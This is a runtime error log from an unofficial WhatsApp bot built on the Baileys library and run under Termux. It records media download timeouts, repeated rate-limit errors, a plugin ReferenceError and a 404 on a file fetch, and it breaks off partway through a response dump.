[20/07/24 19:27:08] - AxiosError: connect ETIMEDOUT 157.240.236.60:443
    at AxiosError.from (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/AxiosError.js:89:14)
    at RedirectableRequest.handleRequestError (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:610:25)
    at RedirectableRequest.emit (node:events:520:28)
    at eventHandlers.<computed> (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:38:24)
    at ClientRequest.emit (node:events:520:28)
    at TLSSocket.socketErrorListener (node:_http_client:502:9)
    at TLSSocket.emit (node:events:520:28)
    at emitErrorNT (node:internal/streams/destroy:170:8)
    at emitErrorCloseNT (node:internal/streams/destroy:129:3)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async downloadEncryptedContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:450:21)
    at async Socket._0x5c2108.<computed> [as downloadMediaMessage] (/data/data/com.termux/files/home/.BOTTT/system/extra.js:2:199931)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_autosticker.js:79:13) {
  port: 443,
  address: '157.240.236.60',
  syscall: 'connect',
  code: 'ETIMEDOUT',
  errno: -110,
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      Origin: 'https://web.whatsapp.com',
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-f4834b68-56f3-4a5a-ad7c-18ca393f648c?ccb=9-4&oh=01_Q5AaIGPqIOL4QCwE7bWB9-E8aifQlCYgSX3I6dZuzn5PQuWG&oe=66C31C01&_nc_sid=000000&mms3=true',
    data: undefined
  },
  request: <ref *1> Writable {
    _events: {
      close: undefined,
      error: [Function: handleRequestError],
      prefinish: undefined,
      finish: undefined,
      drain: undefined,
      response: [Function: handleResponse],
      socket: [Function: handleRequestSocket]
    },
    _writableState: WritableState {
      highWaterMark: 65536,
      length: 0,
      corked: 0,
      onwrite: [Function: bound onwrite],
      writelen: 0,
      bufferedIndex: 0,
      pendingcb: 0,
      [Symbol(kState)]: 17580812,
      [Symbol(kBufferedValue)]: null
    },
    _maxListeners: undefined,
    _options: {
      maxRedirects: 21,
      maxBodyLength: Infinity,
      protocol: 'https:',
      path: '/o1/v/t62.7118-24/f1/m233/up-oil-image-f4834b68-56f3-4a5a-ad7c-18ca393f648c?ccb=9-4&oh=01_Q5AaIGPqIOL4QCwE7bWB9-E8aifQlCYgSX3I6dZuzn5PQuWG&oe=66C31C01&_nc_sid=000000&mms3=true',
      method: 'GET',
      headers: [Object: null prototype],
      agents: [Object],
      auth: undefined,
      family: undefined,
      beforeRedirect: [Function: dispatchBeforeRedirect],
      beforeRedirects: [Object],
      hostname: 'mmg.whatsapp.net',
      port: '',
      agent: undefined,
      nativeProtocols: [Object],
      pathname: '/o1/v/t62.7118-24/f1/m233/up-oil-image-f4834b68-56f3-4a5a-ad7c-18ca393f648c',
      search: '?ccb=9-4&oh=01_Q5AaIGPqIOL4QCwE7bWB9-E8aifQlCYgSX3I6dZuzn5PQuWG&oe=66C31C01&_nc_sid=000000&mms3=true'
    },
    _ended: true,
    _ending: true,
    _redirectCount: 0,
    _redirects: [],
    _requestBodyLength: 0,
    _requestBodyBuffers: [],
    _eventsCount: 3,
    _onNativeResponse: [Function (anonymous)],
    _currentRequest: ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /o1/v/t62.7118-24/f1/m233/up-oil-image-f4834b68-56f3-4a5a-ad7c-18ca393f648c?ccb=9-4&oh=01_Q5AaIGPqIOL4QCwE7bWB9-E8aifQlCYgSX3I6dZuzn5PQuWG&oe=66C31C01&_nc_sid=000000&mms3=true HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'Origin: https://web.whatsapp.com\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: mmg.whatsapp.net\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/o1/v/t62.7118-24/f1/m233/up-oil-image-f4834b68-56f3-4a5a-ad7c-18ca393f648c?ccb=9-4&oh=01_Q5AaIGPqIOL4QCwE7bWB9-E8aifQlCYgSX3I6dZuzn5PQuWG&oe=66C31C01&_nc_sid=000000&mms3=true',
      _ended: false,
      res: null,
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'mmg.whatsapp.net',
      protocol: 'https:',
      _redirectable: [Circular *1],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    _currentUrl: 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-f4834b68-56f3-4a5a-ad7c-18ca393f648c?ccb=9-4&oh=01_Q5AaIGPqIOL4QCwE7bWB9-E8aifQlCYgSX3I6dZuzn5PQuWG&oe=66C31C01&_nc_sid=000000&mms3=true',
    [Symbol(shapeMode)]: true,
    [Symbol(kCapture)]: false
  },
  cause: Error: connect ETIMEDOUT 157.240.236.60:443
      at TCPConnectWrap.afterConnect [as oncomplete] (node:net:1607:16) {
    errno: -110,
    code: 'ETIMEDOUT',
    syscall: 'connect',
    address: '157.240.236.60',
    port: 443
  }
}
[20/07/24 19:35:15] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:1) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[20/07/24 19:35:15] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:1) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[20/07/24 19:35:15] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:1) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[23/07/24 17:06:00] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:1) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[23/07/24 17:06:01] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:1) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[23/07/24 17:06:05] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:1) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[23/07/24 17:06:05] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:654:17) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[23/07/24 17:06:09] - Error: rate-overlimit
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async Object.relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:107:1) {
  data: 429,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[23/07/24 18:17:42] - ReferenceError: rules is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/special/rules.js:27:33)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[23/07/24 18:25:33] - ReferenceError: rules is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/special/rules.js:27:33)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[23/07/24 18:25:50] - ReferenceError: rules is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/special/rules.js:27:33)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[23/07/24 18:45:11] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 31332,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 1154771,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 31334,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Tue, 23 Jul 2024 11:47:46 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
